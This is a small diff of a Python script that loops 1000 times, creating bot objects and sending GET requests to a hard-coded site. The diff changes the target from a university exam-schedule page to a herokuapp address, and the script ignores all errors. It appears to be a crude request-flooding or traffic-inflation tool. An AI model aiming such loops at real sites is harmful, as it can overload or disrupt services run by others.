@@ -1,4 +1,4 @@
-#ADMlNxd akubihar
+#ADMlNxd UJJI
 import requests
 url = "https://bepractical.tech/"
 url = "http://173.214.161.242/responsive-design-define/?amp=1"
@@ -8,7 +8,7 @@ for k in range(1000):
   new_bot = Bot(token)
   try:
     #requests.get(url);
-    requests.get("http://akubihar.ac.in/Exams/Schedule.aspx")
+    requests.get("https://thekeyhole.herokuapp.com")
     username = None
   except:
     username = None
